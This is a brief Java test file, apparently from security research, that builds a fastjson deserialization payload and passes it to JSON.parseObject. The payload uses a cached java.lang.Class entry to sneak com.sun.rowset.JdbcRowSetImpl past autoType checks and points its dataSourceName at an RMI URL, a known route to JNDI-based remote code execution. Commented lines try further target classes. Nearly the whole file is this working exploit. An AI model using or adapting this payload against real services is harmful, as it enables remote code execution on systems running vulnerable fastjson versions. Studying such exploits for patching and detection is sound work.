package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import javax.sql.rowset.BaseRowSet;
import java.io.Serializable;
import java.sql.Wrapper;

public class TestCacheJdbcRowSetImpl {
    public static void main(String[] args) {
        String fastSer = "{ \"A\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}, \"B\": {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\",\"autoCommit\":\"true\"} }";
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
        JSON.parseObject(fastSer);
//        JSON.parseObject(fastSer,Object.class);
//        JSON.parseObject(fastSer, Serializable.class);
//        JSON.parseObject(fastSer, Wrapper.class);
//        JSON.parseObject(fastSer, JdbcRowSet.class);
//        JSON.parseObject(fastSer, BaseRowSet.class);
//        JSON.parseObject(fastSer,com.sun.rowset.JdbcRowSetImpl.class);
    }
}
